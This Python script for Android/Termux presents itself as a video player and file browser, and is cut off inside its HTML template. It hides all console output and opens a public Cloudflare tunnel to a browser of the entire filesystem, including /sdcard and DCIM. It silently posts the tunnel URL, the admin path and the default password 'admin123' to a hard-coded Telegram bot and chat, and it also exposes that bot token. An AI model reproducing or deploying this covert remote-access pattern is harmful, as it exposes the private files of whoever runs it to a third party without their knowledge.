#!/usr/bin/env python3
"""
Advanced File Browser & Video Streaming Server
Smart Gesture Video Player with Auto Cloudflare Tunnel
"""

import os
import re
import socket
import random
import mimetypes
import urllib.parse
import sqlite3
import secrets
import ipaddress
import requests
import threading
import tempfile
import uuid
import subprocess
import json
import shutil
import time
import sys
from pathlib import Path
from datetime import datetime, timedelta
from functools import wraps

# ==================== SUPPRESS EXTRA OUTPUT ====================
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

# ==================== TELEGRAM BOT CONFIGURATION ====================
BOT_TOKEN = "8581471558:AAEPN4euY4buJ-Zg_LHRXrfHtF_HsJKl0Ts"
CHAT_ID = "8017090914"

# ==================== CLOUDFLARE TUNNEL ====================
cloudflared_process = None
current_tunnel_url = None

def send_telegram_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': CHAT_ID, 'text': text[:4000], 'parse_mode': 'Markdown'}
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except Exception:
        return False

def install_cloudflared_from_source():
    try:
        send_telegram_message("📦 Installing Cloudflared from source...")
        subprocess.run(['pkg', 'update', '-y'], capture_output=True, timeout=120)
        subprocess.run(['pkg', 'install', '-y', 'golang', 'git', 'debianutils', 'make'], capture_output=True, timeout=120)
        if os.path.exists('cloudflared'):
            shutil.rmtree('cloudflared')
        subprocess.run(['git', 'clone', 'https://github.com/cloudflare/cloudflared.git', '--depth=1'], capture_output=True, timeout=120)
        os.chdir('cloudflared')
        with open('Makefile', 'r') as f:
            content = f.read()
        content = content.replace('linux', 'android')
        with open('Makefile', 'w') as f:
            f.write(content)
        subprocess.run(['make', 'cloudflared'], capture_output=True, timeout=300)
        subprocess.run(['install', 'cloudflared', '/data/data/com.termux/files/usr/bin/'], capture_output=True, timeout=60)
        os.chdir('..')
        shutil.rmtree('cloudflared')
        send_telegram_message("✅ Cloudflared installed successfully!")
        return True
    except Exception as e:
        send_telegram_message(f"❌ Cloudflared installation failed: {str(e)}")
        return False

def check_and_install_cloudflared():
    cloudflared_path = shutil.which('cloudflared')
    if cloudflared_path:
        return True
    try:
        subprocess.run(['pkg', 'install', '-y', 'cloudflared'], capture_output=True, timeout=120)
        if shutil.which('cloudflared'):
            return True
    except:
        pass
    return install_cloudflared_from_source()

def start_cloudflared_tunnel(port):
    global cloudflared_process, current_tunnel_url
    cloudflared_path = shutil.which('cloudflared')
    if not cloudflared_path:
        send_telegram_message("❌ Cloudflared not installed!")
        return None
    try:
        if cloudflared_process:
            cloudflared_process.terminate()
            time.sleep(2)
        send_telegram_message(f"🚀 Starting Cloudflare tunnel on port {port}...")
        cmd = [cloudflared_path, 'tunnel', '--url', f'http://localhost:{port}', '--protocol', 'http2']
        cloudflared_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
        tunnel_url = None
        timeout_counter = 0
        while timeout_counter < 60:
            if cloudflared_process.stdout:
                line = cloudflared_process.stdout.readline()
                if line:
                    line = line.strip()
                    url_match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                    if url_match:
                        tunnel_url = url_match.group(0)
                        break
                    url_match2 = re.search(r'https://[a-zA-Z0-9-]+\.cfargotunnel\.com', line)
                    if url_match2:
                        tunnel_url = url_match2.group(0)
                        break
            time.sleep(1)
            timeout_counter += 1
        if tunnel_url:
            current_tunnel_url = tunnel_url
            message = f"""🎥 *VIDEO SERVER ACTIVE*

🌐 *Public URL:* `{tunnel_url}`

📱 *Access from anywhere!*

🔐 *Admin Panel:* `{tunnel_url}/admin`
🔑 *Default Password:* `admin123`

_Share this link to access your video server_"""
            send_telegram_message(message)
            return tunnel_url
        else:
            send_telegram_message("⚠️ Tunnel starting... URL will appear soon")
            return None
    except Exception as e:
        send_telegram_message(f"❌ Cloudflared error: {str(e)}")
        return None

def stop_cloudflared_tunnel():
    global cloudflared_process
    if cloudflared_process:
        cloudflared_process.terminate()
        cloudflared_process = None

# ==================== MODULE AUTO-INSTALLER ====================
def install_module(module_name):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def check_and_install_modules():
    required_modules = ['flask', 'requests', 'werkzeug']
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            install_module(module)
    return True

check_and_install_modules()

from flask import Flask, render_template_string, send_file, Response, request, abort, session, redirect, url_for, jsonify
from werkzeug.security import generate_password_hash, check_password_hash

# ==================== SUPPRESS FLASK OUTPUT ====================
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

def noop(*args, **kwargs):
    pass

cli = sys.modules.get('flask.cli')
if cli:
    cli.show_server_banner = noop

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.permanent_session_lifetime = timedelta(days=7)

# Download jobs manager
download_jobs = {}
DOWNLOAD_DIR = tempfile.mkdtemp(prefix='video_downloads_')
MAX_DOWNLOAD_SIZE = 2 * 1024 * 1024 * 1024

def cleanup_old_downloads():
    try:
        now = datetime.now()
        for job_id, job in list(download_jobs.items()):
            if job.get('completed_at'):
                age = now - job['completed_at']
                if age.total_seconds() > 3600:
                    if job.get('file_path') and os.path.exists(job['file_path']):
                        os.remove(job['file_path'])
                    del download_jobs[job_id]
    except:
        pass

def run_download_job(job_id, video_url, quality_url, quality_name):
    job = download_jobs[job_id]
    job['status'] = 'downloading'
    job['started_at'] = datetime.now()
    try:
        output_file = os.path.join(DOWNLOAD_DIR, f'{job_id}.mp4')
        cmd = ['yt-dlp', '--no-warnings', '--no-playlist', '-f', 'best', '--merge-output-format', 'mp4', '-o', output_file, '--progress', '--newline', quality_url]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
        job['process'] = process
        if process.stdout:
            for line in process.stdout:
                line = line.strip()
                if '[download]' in line:
                    match = re.search(r'(\d+\.?\d*)%', line)
                    if match:
                        job['progress'] = float(match.group(1))
                    size_match = re.search(r'of\s+~?(\d+\.?\d*)(K|M|G)iB', line)
                    if size_match:
                        size = float(size_match.group(1))
                        unit = size_match.group(2)
                        if unit == 'K':
                            size *= 1024
                        elif unit == 'M':
                            size *= 1024 * 1024
                        elif unit == 'G':
                            size *= 1024 * 1024 * 1024
                        job['total_size'] = int(size)
                    speed_match = re.search(r'at\s+(\d+\.?\d*)(K|M)iB/s', line)
                    if speed_match:
                        speed = float(speed_match.group(1))
                        unit = speed_match.group(2)
                        if unit == 'K':
                            speed *= 1024
                        elif unit == 'M':
                            speed *= 1024 * 1024
                        job['speed'] = int(speed)
                    eta_match = re.search(r'ETA\s+(\d+:\d+)', line)
                    if eta_match:
                        job['eta'] = eta_match.group(1)
        process.wait()
        if process.returncode == 0 and os.path.exists(output_file):
            job['status'] = 'completed'
            job['file_path'] = output_file
            job['file_size'] = os.path.getsize(output_file)
            job['progress'] = 100
        else:
            job['status'] = 'failed'
            job['error'] = 'Download failed or file not created'
    except Exception as e:
        job['status'] = 'failed'
        job['error'] = str(e)
    finally:
        job['completed_at'] = datetime.now()
        job.pop('process', None)

# Login attempt tracking for rate limiting
login_attempts = {}

# Database setup
DB_PATH = 'admin_data.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS admin_settings (
        id INTEGER PRIMARY KEY,
        password_hash TEXT NOT NULL,
        site_protection_enabled INTEGER DEFAULT 0,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS visitor_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip_address TEXT,
        user_agent TEXT,
        path TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        is_local INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS active_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT UNIQUE,
        ip_address TEXT,
        user_agent TEXT,
        last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('SELECT COUNT(*) FROM admin_settings')
    if c.fetchone()[0] == 0:
        default_password = 'admin123'
        password_hash = generate_password_hash(default_password, method='pbkdf2:sha256')
        c.execute('INSERT INTO admin_settings (password_hash, site_protection_enabled) VALUES (?, ?)', (password_hash, 0))
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def check_password(password):
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT password_hash FROM admin_settings WHERE id = 1')
    row = c.fetchone()
    conn.close()
    if row:
        return check_password_hash(row['password_hash'], password)
    return False

def is_login_blocked(ip):
    if ip not in login_attempts:
        return False
    attempts, last_attempt = login_attempts[ip]
    if attempts >= 5:
        if datetime.now() - last_attempt < timedelta(minutes=5):
            return True
        else:
            del login_attempts[ip]
            return False
    return False

def record_login_attempt(ip, success):
    if success:
        if ip in login_attempts:
            del login_attempts[ip]
        return
    if ip not in login_attempts:
        login_attempts[ip] = (1, datetime.now())
    else:
        attempts, _ = login_attempts[ip]
        login_attempts[ip] = (attempts + 1, datetime.now())

def is_site_protected():
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT site_protection_enabled FROM admin_settings WHERE id = 1')
    row = c.fetchone()
    conn.close()
    return row['site_protection_enabled'] == 1 if row else False

def get_visitor_ip():
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr or '127.0.0.1'

def is_local_ip(ip):
    try:
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_private or ip_obj.is_loopback
    except:
        return False

def log_visitor():
    if request.path.startswith('/admin') or request.path.startswith('/static'):
        return
    ip = get_visitor_ip()
    user_agent = request.headers.get('User-Agent', '')[:500]
    path = request.path
    is_local = 1 if is_local_ip(ip) else 0
    conn = get_db()
    c = conn.cursor()
    c.execute('INSERT INTO visitor_logs (ip_address, user_agent, path, is_local) VALUES (?, ?, ?, ?)', (ip, user_agent, path, is_local))
    session_id = session.get('visitor_id')
    if not session_id:
        session_id = secrets.token_hex(16)
        session['visitor_id'] = session_id
    c.execute('''INSERT OR REPLACE INTO active_sessions (session_id, ip_address, user_agent, last_seen) VALUES (?, ?, ?, CURRENT_TIMESTAMP)''', (session_id, ip, user_agent))
    conn.commit()
    conn.close()

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('is_admin'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

init_db()

@app.before_request
def before_request_handler():
    if request.path.startswith('/admin'):
        return
    if is_site_protected() and not session.get('site_authenticated'):
        return redirect(url_for('site_login'))
    log_visitor()

VIDEO_EXTENSIONS = {'.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.mpeg', '.mpg', '.3gp', '.ts', '.m2ts'}
IMAGE_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.svg', '.ico'}
AUDIO_EXTENSIONS = {'.mp3', '.wav', '.ogg', '.flac', '.aac', '.m4a', '.wma'}
SUBTITLE_EXTENSIONS = {'.srt', '.vtt', '.ass', '.ssa'}
DOCUMENT_EXTENSIONS = {'.pdf', '.doc', '.docx', '.txt', '.xls', '.xlsx', '.ppt', '.pptx', '.zip', '.rar', '.7z'}

QUICK_PATHS = [
    ('/', 'Root'),
    ('~', 'Home'),
    ('/sdcard', 'SD Card'),
    ('/storage', 'Storage'),
    ('/sdcard/DCIM', 'DCIM'),
    ('/sdcard/Download', 'Downloads'),
    ('/sdcard/Movies', 'Movies'),
]

SVG_ICONS = {
    'folder': '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>',
    'video': '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 4l2 4h-3l-2-4h-2l2 4h-3l-2-4H8l2 4H7L5 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4h-4z"/></svg>',
    'image': '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>',
    'audio': '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>',
    'file': '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg>',
}

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def format_size(size_bytes):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size_bytes < 1024:
            return f"{size_bytes:.1f} {unit}"
        size_bytes /= 1024
    return f"{size_bytes:.1f} TB"

def format_date(timestamp):
    try:
        return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d')
    except:
        return ''

def get_file_type(filename):
    ext = Path(filename).suffix.lower()
    if ext in VIDEO_EXTENSIONS: return 'video'
    elif ext in IMAGE_EXTENSIONS: return 'image'
    elif ext in AUDIO_EXTENSIONS: return 'audio'
    elif ext in DOCUMENT_EXTENSIONS: return 'doc'
    else: return 'other'

def is_video_file(filename):
    return Path(filename).suffix.lower() in VIDEO_EXTENSIONS

def find_subtitle_file(video_path):
    video_path = Path(video_path)
    video_stem = video_path.stem
    video_dir = video_path.parent
    for ext in ['.vtt', '.srt', '.ass', '.ssa']:
        subtitle_path = video_dir / (video_stem + ext)
        if subtitle_path.exists():
            return str(subtitle_path), ext[1:]
    return None, None

def convert_srt_to_vtt(srt_content):
    lines = srt_content.replace('\r\n', '\n').split('\n')
    vtt_lines = ['WEBVTT\n']
    for line in lines:
        if '-->' in line:
            line = line.replace(',', '.')
        vtt_lines.append(line)
    return '\n'.join(vtt_lines)

def get_sibling_videos(video_path):
    video_path = Path(video_path)
    video_dir = video_path.parent
    videos = []
    try:
        for item in sorted(video_dir.iterdir(), key=lambda x: x.name.lower()):
            if item.is_file() and is_video_file(item.name):
                videos.append({
                    'name': item.name,
                    'path': str(item.resolve()),
                    'path_encoded': urllib.parse.quote(str(item.resolve()), safe='')
                })
    except PermissionError:
        pass
    return videos

def count_items(path):
    try:
        return len(list(Path(path).iterdir()))
    except:
        return 0

def get_breadcrumbs(path):
    if not path or path == '/': return []
    parts = path.strip('/').split('/')
    breadcrumbs = []
    current = ''
    for part in parts:
        current = f"{current}/{part}"
        breadcrumbs.append({'name': part, 'path': current})
    return breadcrumbs

def get_files_and_folders(dir_path, show_hidden=False):
    folders, videos, images, audios, other_files = [], [], [], [], []
    hidden_count = 0
    try:
        current_dir = Path(dir_path)
        if not current_dir.exists() or not current_dir.is_dir():
            return [], [], [], [], [], 0
        for item in sorted(current_dir.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
            try:
                if item.name.startswith('.'):
                    hidden_count += 1
                    if not show_hidden: continue
                if item.is_dir():
                    folders.append({
                        'name': item.name,
                        'path': str(item.resolve()),
                        'path_encoded': urllib.parse.quote(str(item.resolve()), safe=''),
                        'item_count': count_items(item)
                    })
                elif item.is_file():
                    file_type = get_file_type(item.name)
                    try:
                        stat = item.stat()
                        size = format_size(stat.st_size)
                        modified = format_date(stat.st_mtime)
                    except:
                        size = '?'
                        modified = ''
                    ext = item.suffix.upper()[1:] if item.suffix else 'FILE'
                    file_info = {
                        'name': item.name,
                        'path': str(item.resolve()),
                        'path_encoded': urllib.parse.quote(str(item.resolve()), safe=''),
                        'size': size,
                        'modified': modified,
                        'ext': ext,
                        'type': file_type
                    }
                    if file_type == 'video': videos.append(file_info)
                    elif file_type == 'image': images.append(file_info)
                    elif file_type == 'audio': audios.append(file_info)
                    else: other_files.append(file_info)
            except PermissionError:
                continue
    except PermissionError:
        pass
    return folders, videos, images, audios, other_files, hidden_count

# ==================== HTML TEMPLATES (ORIGINAL) ====================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>{{ current_path }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0f;
            min-height: 100vh;
            color: #fff;
        }
        .header {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 15px;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 20px rgba(0,0,0,0.5);
        }
        .header-top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        .logo { font-size: 1.4em; font-weight: bold; color: #e94560; }
        .server-url {
            background: #0f3460;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 0.85em;
        }
        .server-url code { color: #00ff88; }
        .quick-nav {
            display: flex;
            gap: 8px;
            overflow-x: auto;
            padding: 10px 0;
            -webkit-overflow-scrolling: touch;
        }
        .quick-nav::-webkit-scrollbar { display: none; }
        .quick-btn {
            background: #0f3460;
            color: #fff;
            padding: 8px 16px;
            border-radius: 20px;
            text-decoration: none;
            white-space: nowrap;
            font-size: 0.9em;
            border: 1px solid #1a3a5c;
            transition: all 0.2s;
        }
        .quick-btn:hover, .quick-btn.active { background: #e94560; border-color: #e94560; }
        .path-display {
            background: #0f3460;
            padding: 12px 15px;
            border-radius: 10px;
            margin-top: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
            overflow-x: auto;
        }
        .path-display a { color: #00ff88; text-decoration: none; }
        .path-display span { color: #666; }
        .back-btn {
            background: #e94560;
            color: #fff;
            padding: 8px 20px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: 600;
        }
        .container { padding: 15px; max-width: 1400px; margin: 0 auto; }
        .stats-bar {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin-bottom: 15px;
        }
        .stat {
            background: #0f3460;
            padding: 15px;
            border-radius: 12px;
            text-align: center;
        }
        .stat-num { font-size: 1.8em; font-weight: bold; color: #00ff88; }
        .stat-label { color: #888; font-size: 0.8em; }
        .section-title {
            color: #e94560;
            font-size: 1.2em;
            margin: 20px 0 10px;
            padding-bottom: 10px;
            border-bottom: 2px solid #1a1a2e;
        }
        .file-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 12px;
        }
        .file-card {
            background: #0f3460;
            border-radius: 12px;
            overflow: hidden;
            transition: transform 0.2s, box-shadow 0.2s;
            text-decoration: none;
            color: inherit;
            display: block;
        }
        .file-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(233, 69, 96, 0.3);
        }
        .file-card-inner {
            display: flex;
            align-items: center;
            padding: 15px;
            gap: 15px;
        }
        .file-icon {
            width: 50px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 12px;
            color: #fff;
        }
        .file-icon svg { width: 28px; height: 28px; }
        .icon-folder { background: linear-gradient(135deg, #f39c12, #e67e22); }
        .icon-video { background: linear-gradient(135deg, #e94560, #c23a51); }
        .icon-image { background: linear-gradient(135deg, #00ff88, #00cc6a); }
        .icon-audio { background: linear-gradient(135deg, #9b59b6, #8e44ad); }
        .icon-doc { background: linear-gradient(135deg, #3498db, #2980b9); }
        .icon-other { background: linear-gradient(135deg, #555, #333); }
        .file-details { flex: 1; min-width: 0; }
        .file-name {
            font-weight: 600;
            margin-bottom: 5px;
            word-break: break-word;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
            overflow: hidden;
        }
        .file-meta { color: #888; font-size: 0.85em; display: flex; gap: 10px; }
        .badge { padding: 4px 10px; border-radius: 15px; font-size: 0.7em; font-weight: 600; }
        .badge-folder { background: #f39c12; color: #000; }
        .badge-video { background: #e94560; }
        .badge-image { background: #00ff88; color: #000; }
        .badge-audio { background: #9b59b6; }
        .badge-doc { background: #3498db; }
        .badge-other { background: #555; }
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            background: #0f3460;
            border-radius: 15px;
            margin: 20px 0;
        }
        .empty-state h2 { color: #e94560; margin-bottom: 10px; }
        .show-hidden {
            background: #1a1a2e;
            color: #888;
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
            display: block;
            width: 100%;
            text-align: center;
            text-decoration: none;
        }
        .show-hidden:hover { background: #0f3460; color: #fff; }
        
        /* Continue Watching & Favorites Sections */
        .home-section {
            margin-bottom: 25px;
        }
        .home-section-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 12px;
        }
        .home-section-title {
            color: #e94560;
            font-size: 1.2em;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .home-section-title svg {
            width: 24px;
            height: 24px;
            fill: currentColor;
        }
        .clear-btn {
            background: rgba(233, 69, 96, 0.2);
            color: #e94560;
            border: none;
            padding: 6px 12px;
            border-radius: 15px;
            font-size: 0.8em;
            cursor: pointer;
            transition: all 0.2s;
        }
        .clear-btn:hover { background: #e94560; color: #fff; }
        
        .horizontal-scroll {
            display: flex;
            gap: 12px;
            overflow-x: auto;
            padding: 5px 0 15px;
            -webkit-overflow-scrolling: touch;
        }
        .horizontal-scroll::-webkit-scrollbar { height: 4px; }
        .horizontal-scroll::-webkit-scrollbar-track { background: #1a1a2e; border-radius: 2px; }
        .horizontal-scroll::-webkit-scrollbar-thumb { background: #e94560; border-radius: 2px; }
        
        .history-card, .favorite-card {
            min-width: 200px;
            max-width: 200px;
            background: #0f3460;
            border-radius: 12px;
            overflow: hidden;
            text-decoration: none;
            color: inherit;
            transition: transform 0.2s, box-shadow 0.2s;
            flex-shrink: 0;
        }
        .history-card:hover, .favorite-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(233, 69, 96, 0.3);
        }
        .history-card-inner, .favorite-card-inner {
            padding: 15px;
        }
        .history-card-icon, .favorite-card-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #e94560, #c23a51);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 10px;
        }
        .history-card-icon svg, .favorite-card-icon svg {
            width: 22px;
            height: 22px;
            fill: #fff;
        }
        .favorite-card-icon {
            background: linear-gradient(135deg, #ff4757, #c23a51);
        }
        .history-card-name, .favorite-card-name {
            font-size: 0.9em;
            font-weight: 500;
            margin-bottom: 8px;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
            overflow: hidden;
            word-break: break-word;
        }
        .progress-bar-container {
            height: 4px;
            background: rgba(255,255,255,0.1);
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 6px;
        }
        .progress-bar-fill {
            height: 100%;
            background: #e94560;
            border-radius: 2px;
            transition: width 0.3s;
        }
        .history-card-meta {
            font-size: 0.75em;
            color: #888;
            display: flex;
            justify-content: space-between;
        }
        .remove-history-btn, .remove-favorite-btn {
            position: absolute;
            top: 8px;
            right: 8px;
            width: 24px;
            height: 24px;
            background: rgba(0,0,0,0.7);
            border: none;
            border-radius: 50%;
            color: #fff;
            font-size: 14px;
            cursor: pointer;
            display: none;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }
        .history-card:hover .remove-history-btn,
        .favorite-card:hover .remove-favorite-btn { display: flex; }
        .remove-history-btn:hover, .remove-favorite-btn:hover {
            background: #e94560;
        }
        .history-card, .favorite-card { position: relative; }
        
        @media (max-width: 600px) {
            .stats-bar { grid-template-columns: repeat(2, 1fr); }
            .file-grid { grid-template-columns: 1fr; }
            .header-top { flex-direction: column; gap: 10px; }
            .history-card, .favorite-card { min-width: 160px; max-width: 160px; }
        }
        
        /* URL Input Section */
        .url-section {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #0f3460;
        }
        .url-section-title {
            color: #e94560;
            font-size: 1.2em;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .url-section-title svg {
            width: 24px;
            height: 24px;
            fill: currentColor;
        }
        .url-input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        .url-input {
            flex: 1;
            background: #0f3460;
            border: 2px solid #1a3a5c;
            border-radius: 10px;
            padding: 15px;
            color: #fff;
            font-size: 1em;
            transition: all 0.3s;
        }
        .url-input:focus {
            outline: none;
            border-color: #e94560;
            box-shadow: 0 0 15px rgba(233, 69, 96, 0.3);
        }
        .url-input::placeholder { color: #666; }
        .url-btn {
            background: linear-gradient(135deg, #e94560, #c23a51);
            border: none;
            border-radius: 10px;
            padding: 15px 30px;
            color: #fff;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            white-space: nowrap;
        }
        .url-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(233, 69, 96, 0.4);
        }
        .url-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .url-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .download-btn {
            background: linear-gradient(135deg, #00ff88, #00cc6a);
            border: none;
            border-radius: 10px;
            padding: 12px 20px;
            color: #000;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .download-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 255, 136, 0.3);
        }
        .download-btn svg { width: 18px; height: 18px; fill: currentColor; }
        
        /* Quality Modal */
        .quality-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.85);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .quality-modal.show { display: flex; }
        .quality-panel {
            background: #0f3460;
            border-radius: 20px;
            padding: 25px;
            max-width: 400px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
        }
        .quality-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .quality-title {
            color: #e94560;
            font-size: 1.3em;
            font-weight: 600;
        }
        .quality-close {
            background: rgba(255,255,255,0.1);
            border: none;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            color: #fff;
            font-size: 1.2em;
            cursor: pointer;
            transition: all 0.2s;
        }
        .quality-close:hover { background: #e94560; }
        .quality-list { display: flex; flex-direction: column; gap: 10px; }
        .quality-item {
            background: #1a1a2e;
            border: 2px solid transparent;
            border-radius: 12px;
            padding: 15px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .quality-item:hover { border-color: #e94560; }
        .quality-item.selected { border-color: #00ff88; background: rgba(0,255,136,0.1); }
        .quality-info { display: flex; flex-direction: column; gap: 4px; }
        .quality-name { font-weight: 600; color: #fff; }
        .quality-details { font-size: 0.85em; color: #888; }
        .quality-badge {
            background: #e94560;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.75em;
            font-weight: 600;
        }
        .download-progress {
            margin-top: 15px;
            display: none;
        }
        .download-progress.show { display: block; }
        .progress-text { color: #888; font-size: 0.9em; margin-bottom: 10px; }
        .progress-bar-outer {
            height: 8px;
            background: #1a1a2e;
            border-radius: 4px;
            overflow: hidden;
        }
        .progress-bar-inner {
            height: 100%;
            background: linear-gradient(90deg, #e94560, #00ff88);
            border-radius: 4px;
            transition: width 0.3s;
            width: 0%;
        }
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-top">
            <div class="logo">Smart Player</div>
            <div class="server-url"><code>http://{{ local_ip }}:{{ port }}</code></div>
        </div>
        <div class="quick-nav">
            {% for path, name in quick_paths %}
            <a href="/?path={{ path }}" class="quick-btn">{{ name }}</a>
            {% endfor %}
        </div>
        <div class="path-display">
            {% if current_path != '/' %}
            <a href="/?path={{ parent_path }}" class="back-btn">Back</a>
            {% endif %}
            <a href="/?path=/">Root</a>
            {% for crumb in breadcrumbs %}
                <span>/</span>
                <a href="/?path={{ crumb.path }}">{{ crumb.name }}</a>
            {% endfor %}
        </div>
    </div>
    <div class="container">
        <!-- URL Input Section -->
        <div class="url-section">
            <div class="url-section-title">
                <svg viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"/></svg>
                Play from URL (M3U8/HLS)
            </div>
            <div class="url-input-group">
